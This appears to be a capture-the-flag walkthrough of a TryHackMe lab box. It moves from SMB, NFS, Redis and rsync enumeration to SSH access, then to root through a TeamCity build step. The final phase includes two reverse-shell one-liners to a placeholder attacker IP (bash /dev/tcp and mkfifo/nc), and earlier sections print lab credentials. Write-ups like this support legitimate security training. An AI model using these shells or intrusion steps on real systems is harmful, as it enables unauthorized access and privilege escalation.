```
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:10:41:14:39:01:0c:81:c5:d3:43:7c:c0:4b:4c:13 (RSA)
|   256 ad:b8:17:ab:bd:7e:cf:db:2f:d0:16:6e:68:2e:47:ec (ECDSA)
|_  256 2f:f2:04:69:2a:8f:96:c6:56:10:44:f6:69:a4:19:f2 (ED25519)
111/tcp  open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33356/udp   mountd
|   100005  1,2,3      43485/tcp6  mountd
|   100005  1,2,3      44067/tcp   mountd
|   100005  1,2,3      46331/udp6  mountd
|   100021  1,3,4      34703/udp6  nlockmgr
|   100021  1,3,4      39801/udp   nlockmgr
|   100021  1,3,4      42509/tcp6  nlockmgr
|   100021  1,3,4      43909/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open     netbios-ssn Samba smbd 4
445/tcp  open     netbios-ssn Samba smbd 4
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     nfs         3-4 (RPC #100003)
9090/tcp filtered zeus-admin
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 1s
| smb2-time: 
|   date: 2026-01-05T00:37:46
|_  start_date: N/A

```

```
└─$ smbclient -L //10.67.135.105/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (ip-10-67-135-105 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.67.135.105 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

└─$ smbclient  //10.67.135.105/shares 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                15376180 blocks of size 1024. 2022764 blocks available

smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 06:45:10 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  services.txt                        N       38  Sat Feb  6 06:45:09 2021

                15376180 blocks of size 1024. 2022764 blocks available
smb: \temp\> get services.txt
getting file \temp\services.txt of size 38 as services.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \temp\> cd ..
smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 04:27:33 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  data.txt                            N       48  Tue Feb  2 04:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021

                15376180 blocks of size 1024. 2022764 blocks available
smb: \data\> get data.txt
getting file \data\data.txt of size 48 as data.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \data\> get business-req.txt
getting file \data\business-req.txt of size 190 as business-req.txt (0.1 KiloBytes/sec) (average 0.0 KiloBytes/sec)

┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
└─$ ls
business-req.txt  data.txt  services.txt

┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
└─$ cat business-req.txt 
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.

┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
└─$ cat services.txt 
THM{0a09d51e4..........866a497440a}

┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
└─$ cat data.txt 
Purge regularly data that is not needed anymore

```

```
└─$ showmount -e 10.67.135.105
Export list for 10.67.135.105:
/opt/conf *
                                                                                                                                                 
┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
└─$ sudo mkdir /mnt/nfs                                     
[sudo] password for kali: 

┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
└─$ sudo mount -t nfs 10.67.135.105:/opt/conf /mnt/nfs 

┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
└─$ cd /mnt/nfs

┌──(kali㉿kali)-[/mnt/nfs]
└─$ ls
hp  init  opt  profile.d  redis  vim  wildmidi

┌──(kali㉿kali)-[/mnt/nfs]
└─$ cd redis 

┌──(kali㉿kali)-[/mnt/nfs/redis]
└─$ ls
redis.conf

```

```
└─$ redis-cli -h 10.67.135.105
10.67.135.105:6379> ls
(error) ERR unknown command `ls`, with args beginning with: 
(3.15s)
10.67.135.105:6379> AUTH B65Hx562F@ggAZ@F
OK
(0.51s)
10.67.135.105:6379> keys *
1) "tmp"
2) "marketlist"
3) "authlist"
4) "internal flag"
5) "int"
10.67.135.105:6379> LRANGE authlist 0 -1
6) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
7) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
8) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
9) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
10.67.135.105:6379> get internal flag
(error) ERR wrong number of arguments for 'get' command
10.67.135.105:6379> get "internal flag"

```

```
└─$ echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg" | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v


└─$ rsync --list-only rsync://rsync-connect@10.67.135.105/files
Password: 
drwxr-xr-x          4,096 2026/01/04 19:34:18 .
drwxr-xr-x          4,096 2025/06/28 12:16:36 ssm-user
drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal
drwxr-xr-x          4,096 2026/01/04 19:34:19 ubuntu

┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
└─$ rsync --list-only rsync://rsync-connect@10.67.135.105/files/sys-internal/
Password: 
drwxr-xr-x          4,096 2021/02/06 07:49:29 .
-rw-------             61 2021/02/06 07:49:28 .Xauthority
lrwxrwxrwx              9 2021/02/01 08:33:19 .bash_history
-rw-r--r--            220 2021/02/01 07:51:14 .bash_logout
-rw-r--r--          3,771 2021/02/01 07:51:14 .bashrc
-rw-r--r--             26 2021/02/01 07:53:18 .dmrc
-rw-r--r--            807 2021/02/01 07:51:14 .profile
lrwxrwxrwx              9 2021/02/02 09:12:29 .rediscli_history
-rw-r--r--              0 2021/02/01 07:54:03 .sudo_as_admin_successful
-rw-r--r--             14 2018/02/12 14:09:01 .xscreensaver
-rw-------          2,546 2021/02/06 07:49:35 .xsession-errors
-rw-------          2,546 2021/02/06 06:40:13 .xsession-errors.old
-rw-------             38 2021/02/06 06:54:25 user.txt
drwxrwxr-x          4,096 2021/02/02 04:23:00 .cache
drwxrwxr-x          4,096 2021/02/01 07:53:57 .config
drwx------          4,096 2021/02/01 07:53:19 .dbus
drwx------          4,096 2021/02/01 07:53:18 .gnupg
drwxrwxr-x          4,096 2021/02/01 07:53:22 .local
drwx------          4,096 2021/02/01 08:37:15 .mozilla
drwxrwxr-x          4,096 2021/02/06 06:43:14 .ssh
drwx------          4,096 2021/02/02 06:16:16 .thumbnails
drwx------          4,096 2021/02/01 07:53:21 Desktop
drwxr-xr-x          4,096 2021/02/01 07:53:22 Documents
drwxr-xr-x          4,096 2021/02/01 08:46:46 Downloads
drwxr-xr-x          4,096 2021/02/01 07:53:22 Music
drwxr-xr-x          4,096 2021/02/01 07:53:22 Pictures
drwxr-xr-x          4,096 2021/02/01 07:53:22 Public
drwxr-xr-x          4,096 2021/02/01 07:53:22 Templates
drwxr-xr-x          4,096 2021/02/01 07:53:22 Videos

┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
└─$ rsync -av rsync://rsync-connect@10.67.135.105/files/sys-internal/user.txt .
Password: 
receiving incremental file list
user.txt

sent 43 bytes  received 134 bytes  2.88 bytes/sec
total size is 38  speedup is 0.21

┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
└─$ cat user.txt                           

```

```
└─$ ssh-keygen -f ./id_rsa                                  
Generating public/private ed25519 key pair.
Enter passphrase for "./id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:MONh6GTLFZxu1ulYYD+zzLm9i1F3Diu7u2+1PH9Bv9A kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|     ...         |
|     .=.         |
|    +oB+ .       |
|   = =+=B      . |
|    +o.*S=. o + .|
|      . *. . *.E.|
|        .o. .oo.o|
|        .o.o. +..|
|        . BO.  oo|
+----[SHA256]-----+
                                                                                                                                                           
┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
└─$ ls
business-req.txt  data.txt  id_rsa  id_rsa.pub  services.txt  user.txt

```

```
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
└─$ ssh -i id_rsa sys-internal@10.67.135.105
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)


sys-internal@ip-10-67-135-105:~$ ls

```

Port forward to get wtomcat

```
ssh -i id_ed25519 sys-internal@10.10.52.162 -L 8111:127.0.0.1:8111

```

🛠️ Phase 3: TeamCity (Tomcat) to Root Privilege Escalation
1. The Discovery

Through internal enumeration (ss -tulpn), we discovered a service listening on Localhost (127.0.0.1) Port 8111. Using a process check (ps aux), we confirmed this was a TeamCity server (which runs on a Java/Tomcat stack) and, crucially, it was being executed by the root user.
2. Port Forwarding (Pivoting)

Because the service was bound to 127.0.0.1, it wasn't accessible from our Kali machine directly. We used SSH Tunneling to forward the port:
Bash

ssh -L 8111:127.0.0.1:8111 sys-internal@10.67.138.81

This allowed us to access the TeamCity web interface at http://localhost:8111 on our local browser.
3. Authentication & Access

We gained access to the administration panel. In this scenario, we hunted for credentials in internal configuration files (found in /opt/conf/redis/redis.conf) or logs, identifying the password: B65Hx562F@ggAZ@F.
4. Code Execution via Build Agent

TeamCity is designed to run code (builds). By creating a Manual Project and a Build Configuration, we gained the ability to define Build Steps.

    Runner Type: Command Line

    Run: Custom Script

    Payload: ```bash #!/bin/bash bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1

    *Note: The `#!/bin/bash` header was critical to avoid the "Bad fd number" error caused by the default shell (`/bin/sh`) not supporting the `>&` redirection syntax.*


```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attack_IP> <PORT> >/tmp/f
```

5. Capturing the Flag

When the build was triggered, the TeamCity Build Agent executed the script. Since the agent process was owned by root, the reverse shell returned to our Kali listener (nc -lvnp 4444) was a Root Shell.
Bash

whoami
# root
cat /root/root.txt
